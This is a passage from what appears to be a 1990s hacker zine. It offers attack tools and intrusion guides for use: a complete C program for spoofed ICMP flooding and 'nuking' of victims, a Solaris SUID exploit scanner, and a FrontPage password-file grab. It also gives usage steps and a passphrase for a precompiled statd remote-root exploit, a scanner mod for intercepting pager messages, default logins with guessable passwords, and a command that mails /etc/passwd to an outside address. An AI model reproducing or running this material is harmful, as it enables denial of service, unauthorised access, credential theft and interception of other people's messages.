Most of the time this will return a password file with around 4 lines in it,
the passwords will be encrypted, but if you use L0phTCrack 1.5 (available from
www.l0pht.com), then you can break the encryption.

if the service.pwd doesn't exist, then check out the files in /_vti_pvt, as
they will be listed straight off.

Also, certain users may have FrontPage extensions installed, so try URL's
like...

     http://www.site.here.com/~mike/_vti_pvt/service.pwd

We're sure you get the idea, a simple yet affective exploit.

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  5. sunscan.sh : so1o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

#!/bin/sh
#
# exploit scanner for SunOS 5.5.x (solaris 2.5.x)
# by so1o@d-lab.com.ar
#
# Simple little shell script that will quickly scan SunOS 5.5.x boxes for
# local holes, if your dumb, this is how you run it..
#
# % uname -a
# Sun Microsystems SunOS 5.5.1 sparc blah blah blah..
# % sh sunscan.sh
#
# if the system isn't running SunOS 5.5.1, then the script will still work,
# but exploits may not be available for certain programs under SunOS 4.1.x
# or whatever you run the scanner on.
#

echo " .o. Scanning for all known exploitable programs now, Please be patient..."

if [ -s /tmp/report ]; then
        cp /tmp/report /tmp/report.old
        echo " .o. Moving old report file to /tmp/report.old"
else
        echo " .o. Preparing report file at /tmp/report"
fi

if [ -s /tmp/suidprogs ]; then
        rm /tmp/suidprogs
        echo " .o. Deleting old log files..."
else
        echo " .o. No old log files detected..."
fi

echo " "
echo "  Team CodeZero Solaris Security Tool Version 1.0 Report :" > /tmp/report
echo "  ========================================================" >> /tmp/report
echo " " >> /tmp/report

if [ -s /bin/passwd ]; then
echo " .o. /bin/passwd exists, checking for vunerabilities..."
        if test -u /bin/passwd
        then
                echo " .o. /bin/passwd is suid and seems exploitable."
                echo "  .o. The scanner found /bin/passwd could be exploitable." >> /tmp/report
                echo "/bin/passwd" > /tmp/suidprogs
        else
                echo " .o. /bin/passwd is not exploitable."
        fi
else
        echo " .o. /bin/passwd doesn't exist!"
fi

if [ -s /bin/eject ]; then
echo " .o. /bin/eject exists, checking for vunerabilities..."
        if test -u /bin/eject
        then
                echo " .o. /bin/eject is suid and seems exploitable."
                echo "  .o. The scanner found /bin/eject could be exploitable." >> /tmp/report
                echo "/bin/eject" >> /tmp/suidprogs
        else
                echo " .o. /bin/eject is not exploitable."
        fi
else
        echo " .o. /bin/eject doesn't exist!"
fi


if [ -s /bin/fdformat ]; then
echo " .o. /bin/fdformat exists, checking for vunerabilities..."
        if test -u /bin/fdformat
        then
                echo " .o. /bin/fdformat is suid and seems exploitable."
                echo "  .o. The scanner found /bin/fdformat could be exploitable." >> /tmp/report
                echo "/bin/fdformat" >> /tmp/suidprogs
        else
                echo " .o. /bin/fdformat is not exploitable."
        fi
else
        echo " .o. /bin/fdformat doesn't exist!"
fi

if [ -s /usr/sbin/ffbconfig ]; then
echo " .o. /usr/sbin/ffbconfig exists, checking for vunerabilities..."
        if test -u /usr/sbin/ffbdonfig
        then
                echo " .o. /usr/sbin/ffbconfig is suid and seems exploitable."
                echo "  .o. The scanner found /usr/sbin/ffbconfig could be exploitable." >> /tmp/report
                echo "/usr/sbin/ffbconfig" >> /tmp/suidprogs
        else
                echo " .o. /usr/sbin/ffbconfig is not exploitable."
        fi
else
        echo " .o. /usr/sbin/ffbconfig doesn't exist!"
fi

if [ -s /usr/bin/rlogin ]; then
echo " .o. /usr/bin/rlogin exists, checking for vunerabilities..."
        if test -u /usr/bin/rlogin
        then
                echo " .o. /usr/bin/rlogin is suid and seems exploitable."
                echo "  .o. The scanner found /usr/bin/rlogin could be exploitable." >> /tmp/report
                echo "/usr/bin/rlogin" >> /tmp/suidprogs
        else
                echo " .o. /usr/bin/rlogin is not exploitable."
        fi
else
        echo " .o. /usr/bin/rlogin doesn't exist!"
fi

if [ -s /usr/dt/bin/sdtcm_convert ]; then
echo " .o. /usr/dt/bin/sdtcm_convert exists, checking for vunerabilities..."
        if test -u /usr/dt/bin/sdtcm_convert
        then
                echo " .o. /usr/dt/bin/sdtcm_convert is suid and seems exploitable."
                echo "  .o. The scanner found /usr/dt/bin/sdtcm_convert could be exploitable." >> /tmp/report
                echo "/usr/dt/bin/sdtcm_convert" >> /tmp/suidprogs
        else
                echo " .o. /usr/dt/bin/sdtcm_convert is not exploitable."
        fi
else
        echo " .o. /usr/dt/bin/sdtcm_convert doesn't exist!"
fi

if [ -s /usr/X11/bin/xlock ]; then
echo " .o. /usr/X11/bin/xlock exists, checking for vunerabilities..."
        if test -u /usr/X11/bin/xlock
        then
                echo " .o. /usr/X11/bin/xlock is suid and seems exploitable."
                echo "  .o. The scanner found /usr/X11/bin/xlock could be exploitable." >> /tmp/report
                echo "/usr/X11/bin/xlock" >> /tmp/suidprogs
        else
                echo " .o. /usr/X11/bin/xlock is not exploitable."
        fi
else
        echo " .o. /usr/X11/bin/xlock doesn't exist!"
fi

if [ -s /usr/vmsys/bin/chkperm ]; then
        echo " .o. The chkperm program exists, the chkperm technique should work..."
        echo "  .o. The scanner found /usr/vmsys/bin/chkperm could be exploitable." >> /tmp/report
        echo "/usr/vmsys/bin/chkperm" >> /tmp/suidprogs
else
        echo " .o. /usr/vmsys/bin/chkperm doesn't exist!"
fi

echo " "
echo " " >> /tmp/report
echo "  End of report, this scanner was scripted by so1o@d-lab.com.ar" >> /tmp/report
echo " "
echo " .o. The scan is now complete, a report has been written to /tmp/report  .o."
echo " "
exit 0

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  6. classb.c : falken
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

This will be useful to someone, somewhere..

/* the subnetting program */
/* working version of a Class B subnetter falken@rune.org */
/* Werd silitek */
 
#include <stdio.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netdb.h>
 
void main(int argc,char *argv[]) 
                {
                int counter1=0;
                int counter2=0;
                while(counter2 < 256)
                   {
                       counter1++;
                       if (counter1 == 255)
                           { counter2++;counter1=0;};
                         
                       printf("%s.%i.%i\n",argv[1],counter2,counter1);
                   };
                };

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  7. icmp444v.c : e4elite
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

/*

   ICMP444V.c
   Kickass ICMP client, does some phat shit, runs fine from Linux, should
   also compile on a Sun, compile, then run for usage, or read this..

   To flood with echo spoofing :
   -----------------------------
   icmp444 E <spoof address> <ip of victim> <size of packet>

   eg : ~# icmp444 E www.nasa.gov ppp123.sucker.com 1000

   To overload the fucker      :
   -----------------------------

   icmp444 O <spoof1> <spoof2> <ip of victim>

   eg : ~# icmp444 0 www.nasa.gov www.fbi.gov ppp42.sucker.com

   Bog standard ICMP nuke      :
   -----------------------------

   icmp444 X <destination of packet> <port source> <ip of source>
                 <port of destination++;> <code of icmp (eg. 2 )>

   eg : ~# icmp444 X irc.devil.com 6667 ppp45.sucker.com 1020 2

   To nuke an NT/Win96 box     :
   -----------------------------

   icmp444 X <destination of packet> <port source++;> <ip of source>
                                             <port of destination> 2

   eg : ~# icmp444 N  ppp56.sucker.com 1020 irc.devil.com 6667 2


   e4elite [nWo]
   
*/

#define IPHDRSIZE sizeof(struct iphdr)
#define ICMPHDRSIZE sizeof(struct icmphdr)

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <fcntl.h>
#include <syslog.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <linux/ip.h>
#include <linux/icmp.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <netinet/ip_icmp.h>

#ifdef SYSV
#define bcopy(s1,s2,len) memcpy(s2,s1,len)
#endif

/*
 * in_cksum --
 *  Checksum routine for Internet Protocol family headers (C Version)
 */

unsigned short in_cksum(addr, len)
    u_short *addr;
    int len;
{
    register int nleft = len;
    register u_short *w = addr;
    register int sum = 0;
    u_short answer = 0;
 
    /*
     * Our algorithm is simple, using a 32 bit accumulator (sum), we add
     * sequential 16 bit words to it, and at the end, fold back all the
     * carry bits from the top 16 bits into the lower 16 bits.
     */

    while (nleft > 1)  {
        sum += *w++;
        nleft -= 2;
    }
 
    /* mop up an odd byte, if necessary */

    if (nleft == 1) {
        *(u_char *)(&answer) = *(u_char *)w ;
        sum += answer;
    }
 
    /* add back carry outs from top 16 bits to low 16 bits */

    sum = (sum >> 16) + (sum & 0xffff); /* add hi 16 to low 16 */
    sum += (sum >> 16);         /* add carry */
    answer = ~sum;              /* truncate to 16 bits */
    return(answer);
}

unsigned int host2ip(char *serv)
{
   struct sockaddr_in sin;
   struct hostent *hent;
      
  hent=gethostbyname(serv);
  if(hent == NULL) return 0;
  bzero((char *)&sin, sizeof(sin));
  bcopy(hent->h_addr, (char *)&sin.sin_addr, hent->h_length);
  return sin.sin_addr.s_addr;
 }

                     
main(int argc, char **argv)
   {
        struct sockaddr_in sin_dst;
	unsigned char packet[4098];
	struct iphdr   *ip;
	struct icmphdr *icmp;
	struct iphdr    *ipfake;
	unsigned char  *data;
	
	 unsigned           s_port;
	 unsigned           t_port;
                               
	int s;
        int i;
	int DATA;
	int s_portinc,t_portinc;
	
	ip = (struct iphdr *)packet;
	icmp = (struct icmphdr *)(packet+IPHDRSIZE);
	ipfake = (struct iphdr*)(packet+IPHDRSIZE+ICMPHDRSIZE );
	data = (char *)(packet+IPHDRSIZE+ICMPHDRSIZE+IPHDRSIZE);
	
	memset(packet, 0, 4098);
	
        printf(" ICMP444 ready for action!\n\n");
	
	if(argc == 1) {
	
        printf(" To flood with echo spoofing : \n");
        printf(" icmp444 E <spoof address> <ip of victim> <size of packet>\n");
        printf(" eg : ~# icmp444 E www.nasa.gov ppp123.sucker.com 1000\n\n");
        printf(" To overload the fucker      : \n");
        printf(" icmp444 O <spoof1> <spoof2> <ip of victim>\n");
        printf(" eg : ~# icmp444 0 www.nasa.gov www.fbi.gov ppp42.sucker.com \n\n");
        printf(" Bog standard ICMP nuke      : \n\n");
        printf(" icmp444 X <destination of packet> <port source> <ip of source> <port of destination++;> <code of icmp (eg. 2 )> \n");
        printf(" eg : ~# icmp444 X irc.devil.com 6667 ppp45.sucker.com 1020 2 \n\n");
        printf(" To nuke an NT/Win96 box     : \n ");
        printf(" icmp444 X <destination of packet> <port source++;> <ip of source> <port of destination> 2 \n"); 
        printf(" eg : ~# icmp444 N  ppp56.sucker.com 1020 irc.devil.com 6667 2 \n\n");
	
	}
	
	/* OPEN A RAW_SOCKET ! */;
	
	 s=socket(AF_INET, SOCK_RAW, 255);
	        if(s < 0)
	        {
                fprintf(stderr, "can't open raw socket\n");
	        exit(0);
	        }
	
	#ifdef IP_HDRINCL
	 if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char *)&i, sizeof(i)) < 0)
	      {
	        fprintf(stderr, "cant set IP_HDRINCL\n");
	         close(s);
	        exit(0); }
	#endif
	                                                    
	
	if (*(argv[1]+0)=='E'){
	
	DATA=atoi(argv[4]);
	
	ip->saddr    = host2ip(argv[2]);
	ip->daddr    = host2ip(argv[3]);
	ip->version  = 4;
	ip->ihl      = 5; 
	ip->ttl      = 255;
	ip->protocol = 1; 
	ip->tot_len  = htons(IPHDRSIZE +ICMPHDRSIZE+DATA);
	ip->tos      = 0;
	ip->id       = 0;
	ip->frag_off = 0;
	ip->check    = in_cksum(packet,IPHDRSIZE);
	
	icmp->type = 8; 
	icmp->code = 0;
	
	icmp->checksum = in_cksum(icmp,ICMPHDRSIZE+DATA); 
	
	sin_dst.sin_addr.s_addr = ip->daddr;
        sin_dst.sin_family = AF_INET; 
        printf(" HEY! %s u r dead  \n",argv[3] );
	for(;;){

	sendto(s,packet,IPHDRSIZE+ICMPHDRSIZE+DATA,0,
          (struct sockaddr *)&sin_dst,sizeof(struct sockaddr)); }
	
     }

if (*(argv[1]+0)=='O'){

     unsigned int IP1;
     unsigned int IP2;
     
     IP1= host2ip(argv[2]); 
     IP2 = host2ip(argv[3]);   
     ip->daddr    =  host2ip(argv[4]);
                  
     ip->version  = 4;
     ip->ihl      = 5;
     ip->ttl      = 255;
     ip->protocol = 1;
     ip->tot_len  = htons(IPHDRSIZE +ICMPHDRSIZE );
     ip->id       = 2;
     ip->frag_off = 0;
     ip->tos      = 0; 
            
     ip->check    = in_cksum(packet,IPHDRSIZE); 
    icmp->type = 3;
    icmp->code = 5;
    icmp->checksum = 1234;             
    printf(" HEY! %s  are you on a fucking 8086?  \n",argv[4] );                                           
  
  for(;;){
    ip->saddr = IP1;
    sin_dst.sin_addr.s_addr = ip->daddr;
    sin_dst.sin_family = AF_INET;
    
    sendto(s,packet,IPHDRSIZE+ICMPHDRSIZE,0,
           (struct sockaddr *)&sin_dst,sizeof(struct sockaddr)); 
    
    ip->saddr = IP2;
    sin_dst.sin_addr.s_addr = ip->daddr;
    
    sendto(s,packet,IPHDRSIZE+ICMPHDRSIZE,0,
               (struct sockaddr *)&sin_dst,sizeof(struct sockaddr));
            }
  }
 
if(*(argv[1]+0)=='X'){ 
s_portinc=0;
t_portinc=1;
goto go;
} 
if (*(argv[1]+0)=='N'){

s_portinc=1;
t_portinc=0;
go:

  
ip->saddr    = host2ip(argv[4]);
ip->daddr    = host2ip(argv[2]);
s_port=atoi(argv[3]);

t_port=atoi(argv[5]);
                                  
ip->version  = 4;
ip->ihl      = 5;
ip->ttl      = 255;
ip->protocol = 1;
ip->tot_len  = htons(IPHDRSIZE+ICMPHDRSIZE+IPHDRSIZE+8);
ip->tos      = 0;
ip->id       = 2;
ip->frag_off = 0;
ip->check    = in_cksum(packet,IPHDRSIZE);
                                                                                                  
                                                                                                  
icmp->type = 3;
icmp->code = atoi(argv[6]);

ipfake->saddr = ip->daddr;
ipfake->daddr = ip->saddr;
 
ipfake->version  = 4;
ipfake->ihl      = 5;
ipfake->ttl      = 255;
ipfake->protocol = IPPROTO_TCP;
ipfake->tot_len  = htons(IPHDRSIZE+36);
ipfake->tos      = 0;
ipfake->id       = 22;
ipfake->frag_off = 0;
ipfake->check    = in_cksum(ipfake,IPHDRSIZE);

for(;;){

 *((unsigned int *)data)          = htons(s_port);
 *((unsigned int *)(data+2))      = htons(t_port);
 *((unsigned long *)(data+4))     = 6580;
 icmp->checksum=0;
 icmp->checksum = in_cksum(icmp,36);

 sin_dst.sin_addr.s_addr = ip->daddr;
 sin_dst.sin_family = AF_INET;                     
                         
 sendto(s,packet,IPHDRSIZE+36,0,
 (struct sockaddr *)&sin_dst,sizeof(struct sockaddr)); 

printf("sport,tport:%i,%i\n\n",s_port,t_port);

s_port=s_port+s_portinc;
t_port=t_port+t_portinc;

usleep(200);
}
}                                           
}

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ FONES / SCANNING ]=========[ .SECTION C. ]===========[ FONES / SCANNING ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  1. Realistic Pro-50 scanner discriminator mod : xFli
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

The Realistic pro-50 is a very cheap scanner available from tandy, which is
ideal for, amongst other things, pager interception. If you have a machine
with windows 95 and a soundcard, using one of these scanners you can
intercept POCSAG signalling for the entire country. 

there is poc32 software for win95 that allows decoding without any extra
hardware (Such as the l0pht's hardware decoder). So check out www.l0pht.com
or do a websearch for it..

Before you can get optimum decode rates, you need to modify the scanner so
you can tap the baseband audio, before the pure signal has been mashed up by
amplification. This is very simple and should be easy for anyone with a
little soldering iron experience. 

You will need a soldering iron, solder, a philips (star) head screwdriver,
a few bits of insulated hookup wire and a mono 3.5mm jack socket.

First, remove the back half of the scanner's case by undoing the four large
screws at the sides. Now you should see a pcb with a couple of 16 pin IC's
and some other bits and pieces.

Look at the codes printed on the IC's. The one we want will be labelled
something along the lines of 'KA-3661N'. Its the chip nearest the top of the
scanner. Notice there is a pin sticking up from the pcb next to pin 9 of the
chip. This is connected to the discriminator pin of the chip (Thanks tandy!)

Solder 1 length of wire to this pin, be quick to avoid damaging the IC. Next,
look at where the coax (antenna) socket comes into the case. There will be a
small metal tag coming off it which is attached to the nut holding the
connecter onto the case. This is the ground or GND connection. Solder another
length of wire to this. Now, solder these two wires onto your 3.5mm socket,
and find a nice place to mount it in the case (we want this to look good :)
Use a lighter to heat up a nail or similar and make a hole in the case for
the socket. Wrap it in insulating tape to avoid any shorts, then glue it in
and put the case back together.

Plug the scanner into your soundcards microphone socket, using preferably
a _shielded_ audio cable. Start up poc32 and tune the scanner to 153.225
(BT Easyreach paging). Set poc32's baud rate to 1200 and service type to
'auto'. Go to the properties menu, click the hardware&co tab, and select
the soundcard as the device to use. Click ok and hopefully you should see
messages on the screen! If you dont, open up the scanner and check all              
the connections, also check the recording volume in your soundcard setup. 

POCSAG encoded messages are transmitted in batches, expect a _lot_ of traffic
on the bt frequencies. Another nice thing is that any pager message is
transmitted to the _entire_ country, so if you are in glasgow you can pick
up pages intended for someone in london.

Remember also that a lot of pages aren't just of the 'Ill be back at 5 cook
the dinner hoe' variety. There are a lot of automated systems out there,
including ISP's, ATM (Cash machine) minders, and even remote freezer
monitors.

Oh, and make sure you remember that I'm not responsible if you ruin your
scanner with shoddy soldering :)

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ MISC ]=====================[ .SECTION D. ]=======================[ MISC ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  1. rpc-stat.pgp
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Included in this issue of Confidence Remains High is a file called rpc-stat.pgp
it is infact the PRECOMPILED version of the original statd exploit, it will
remotely root any SunOS 5.4 system running statd, the statdscan.c in section B
*WILL* scan for this vulnerability and not the 551 x86 version, so, this is
how you use it..

  1: use pgp to decrypt it, the passphrase is pop3, you don't need a key.
                                              ^^^^
  2: upload the binary to a SUNOS system, it will run from basically any
     SunOS system (4.1.3, 5.4, 5.5.1 etc.), I have tried it from many..

  3: run the binary like this...

  % rpc-stat www.fmb.com
  rpc.statd located on port 31227
  sent exploit code, waiting for shell...
  # whoami
  root
  # who
  #
  # uname -a
  Sun Microsystems SunOS 5.4 generic blah blah blah...
  # 

....You now have root on www.fmb.com, it's really as simple as that!

You can try to disassemble the binary, and then reassemble it so it will
run from Linux systems, thats possible.

Have fun kids! I've had a great time with it!

so1o

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  2. If you're really dumb : so1o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

An Introduction to Unix, flavours, users and files.
===================================================

Unix is a multi-user, multi-tasking operating system, as used by Schools and
Universities for development, research, a whole multitude of tasks, Unix is
also used by companies in manufacturing, databases, you name it, Unix is used
for it, most www servers also run Unix.

If a Unix system is connected to a network, or the internet, then users can
remotely log into the system, if they have the correct login and password,
Unix systems can support up to hundreds of users all running programs and
doing different things on that system, because it's also capable of multi-
tasking, so users log into Unix systems, either from a terminal locally (ie.
in the same building, or room), or remotely (ie. across the internet, or a
LAN - Local Area Network), provided the have a valid login and password.


Connecting to a remote Unix system :
====================================

To connect to a remote Unix system, we use a program called TELNET, this is
found by default on all Unix systems, and is also shipped with some Windows
systems, if you don't have telnet.exe, or a Unix account / system, the I
suggest you go to www.tucows.com and search for a telnet client.

From a Unix system, we would connect to abc.123.com using..

$ telnet abc.123.com

From a Windows system, we would run telnet.exe and the go file Ý remote system
and type abc.123.com and click on "OK", it should then connect after a few
seconds..

Identifying the Unix version :
==============================

The first thing we must do to try and work out how we should break into the
system is identify the version of Unix it is running.

There are many different types of the Unix operating system, called flavours,
the most common Unix flavours are..

 Linux, SunOS (Solaris), IRIX, FreeBSD, BSDi, Ultrix, Digital Unix, AIX..

You can usually identify the type of Operating System by connecting to the
remote system, so we would use a program called telnet, which allows us to
connect to remote systems across the internet, from a Unix system we would
type...

% telnet voycrs.gsfc.nasa.gov

and from windows we would run telnet.exe, then go File Ý Remote system, and
type in "voycrs.gsfc.nasa.gov", and then connect to that system, when it
connects, you will see something like this..

 Unix System V Release 4.0 (voycrs)

 login:

That's a standard login prompt, and we are told that the system is running
Unix System V Release 4.0, which is the equivalent of a SunOS system, so
we know that system is running SunOS.

If the system says Linux 2.0.29, then it is running Linux, if the system says
IRIX, then it is running IRIX, it's pretty simple..

Users on a Unix system :
========================

The user list is in the /etc/passwd file on a Unix system, each user has a
login assigned to them, here are the super-user accounts logins..

root                   - the root user can fully control the system, remove any
                         files, and even shut the system down.
bin                    - the bin user owns most of the programs on the system
adm                    - the adm user is a standard admin account
admin                  - same as above
uucp                   - this is the unix-to-unix copy account
lp                     - this is the lineprinter account
postmaster             - this is the mail admin account

as well as some default accounts..

test                   - used by admins to test certain system programs
4Dgifts                - a default login for IRIX systems
guest                  - widely used login for new users

the passwords for those logins are usually along the lines of..

<none>    admin
test      tutor
qwerty    adm1n
letmein   asdfgh
test1     zxcvbn
test12    secret
abc123    password

If you want to find out if a certain user exists on a Unix system, you can
use finger...

  finger user@host.here.com

that command will tell you if the user exists, you can get a finger client for
windows from www.tucows.com, or use finger from a Unix system, it will be
already installed.

The Unix filesystem :
=====================

The file system in Unix is diveded up into 3 catagories :

        Directories
        Ordinary files
        Special files
          
Basic stucture :        
----------------

(/) - this is abreviation for the root dirctory.

    root level                      root
                                    (/)                                 system
-------------------------------------|----------------------------------level
|      |        |         |                  |        |       |        |
/unix   /etc    /dev      /tmp               /lib     /usr    /usr2    /bin
        |                                        _____|_____
login passwd                                     |    |    |
level                                            /john  /cathy    
                             ________________________|_______________
                            |        |     |      |        |        |
                        .profile   /mail  /pers  /games   /bin     /michelle
*.profile - in case                        |    __|______  |      __|_______
you wich to change your enviroment     capital |        | data   |         |
but after you log off. It sets to             othello  starwars letter letter1
default.                                     

the /unix - is the kernal (in older systems)

/etc      - contains system administrators files,Most are not available to the
            regular user.(this directory contains the /passwd file)

    Here are some files under /etc directory:

    /etc/passwd
    /etc/utmp
    /etc/adm/sulog
    /etc/motd
    /etc/group
    /etc/conf
    /etc/profile
  
/dev - contains files for physical devices such as printer and the disk drives
/tmp - temporary file directory
/lib - dirctory that contains programs for high level languages
/usr - this directory contains dirctories for each user on the system

    Eg. of a list of files under /usr

    /usr/tmp
    /usr/lib
    /usr/docs
    /usr/news
    /usr/spool 
    /usr/spool/lp
    /usr/lib/uucp

/bin - contain executable programs (commands)

    Eg. of a list of programs in /bin

    /bin/passwd
    /bin/chmod
    /bin/uptime
    /bin/whoami
    /bin/uname
    /bin/finger

The root also contains:                                                       

/bck        - used to mount a back up file system.
/install    - Used to install and remove utilities
/lost+found - This is where all the removed files go, This dir is used by fsck
              (1M)
/save       - A utility used to save data
/mnt        - Used for temporary mounting (also /mount)

hidden files :
--------------

files like .rhosts and .profile are hidden from ls listings, because of the .
the . infront of a file makes it hidden, it is a useful way to hide programs,
by calling them .setup and .listing for example.

Local Unix commands (Explained in GREAT detail)
===============================================

These commands are to be run from the shell command prompt, ie. if you are
actually on a Unix system using telnet, the $ and # are command prompts..

At the Unix prompt type the pwd command, it will show you the current working
directory you are in.

# pwd
/root                   - if you have hit gold and hacked the root account!
#                       - the # prompt also means you are a super-user

This gives you the full login directory for the user

or..

$ pwd
/home/john
$

Assuming you have hacked into johns account on the system.

Now lets say you wanted to move down to the michelle directory (you own this)
that contains letters that you wanted to read. You would type in

$ cd michelle or cd /home/john/michelle
$ pwd
/home/john/michelle
$

Going back one directory up type in:

$ cd ..

or going to your parent directory (your home) just type in "cd" or "cd ~"
      
Listing file directories assuming you are in the parent directory:

$ pwd
/home/john
$ ls
mail
pers
games        
bin
michelle

..This won't list hidden files, to list ALL files, type..

$ cd
$ ls -a
:
:
.profile

To list file names in michelle's directory type..

$ ls michelle (that if your in the johns home directory)
$ ls /home/john/michelle (from anywhere on the system)

ls -l            
-----             

The ls -l is an an important command in unix.This command displays the whole
directory in long format, if try to run this in parent directory..

$ ls -l
total 60
-rwxr-x---    5 john      bluebox    10 april 9  7:04  mail
drwx------    7 john      bluebox    30 april 2  4:09  pers
     :            :         :         :     :      :    :
     :            :         :         :     :      :    :
-rwxr-x---     6 cathy    bluebox    13 april 1  13:00 partys
     :            :         :         :     :      :    :
$
   
The total 60 tells one the amount of disk space used in a directory.


File permissions :
==================

The -rwxr-x--- is read in triples of 3.. this tells the user what the file
permissions are.

The first chracter eg (-, d, b, c) - means as follows :

        - is an ordinary file
        d is a directory
        b is block file
        c is a chracter file

And...

        r stands for read permission
        w is write permission
        x is execute

The first colum is read in 3 triples as stated above. The first group of 3
(in -rwxr-x---) after the "-" specifies the permission for the owner of
the file,the second triple are for the groups (the fourth colum) and the
last triple are the permissions for all other users.

Therefore the -rwxr-x--- is read as follows..

The owner john has permission to read, write and execute anything in the bin
directory but the group has no write permission to it and the rest of the
users have no permission at all. The format of one of the lines in the above
output is as follows:

file type-permissions, links, owner, owners group, bytes taken, date, time when
last renued, directory or file name.

You will be able to read andexecute cathys file named party due her being in
the same user group as you.

chmod                    
-----             
The chmod command changes permission of a directory or a file.Format is
chmod who+,-,=r,w,x
The who is substituted by u-user,g-group,o-other users,a-all.
The + means add permission,- means remove permission,= - assign.  
Example :If you wanted all other users to read the file name mail ,type:   

$ chmod o+r mail
 
cat         
---          

Now suppose you wanted to read the file letter. You could type..

$ cat letter
line one ...\
line two ... }- the output of letter
line three../
$

or..

If you are in any other directory type in :

$ cat /home/john/michelle/letter

and you will have the same output.

Some cat options are  -s,-u,-v,-e,-t

Special Chracters in Unix:
-------------------------
*     - matches any number of single characters eg. $ ls john* will list
        all files that begin with john
[...] - matchs any one of the chracter in the [ ]
?     - matches any single chracter
&     - runs a process in the backgroung leaving your terminal free
$     - values used for variables also $n - null argument
>     - redirectes output ls -la > /tmp/list
<     - redirects input to come from a file
>>    - redirects command to be added (appended) to the end of a file
|     - pipe output (eg: cat /etc/passwd Ý mail tk85@hotmail.com will mail
                     tk85@hotmail.com the /etc/passwd file)
"..." - Turn of meaning of special chracters excluding $,`
`...` - allows command output in to be used in a command line
'...' - turns of special meaning of all chracters

Common local commands :
=======================

passwd
------

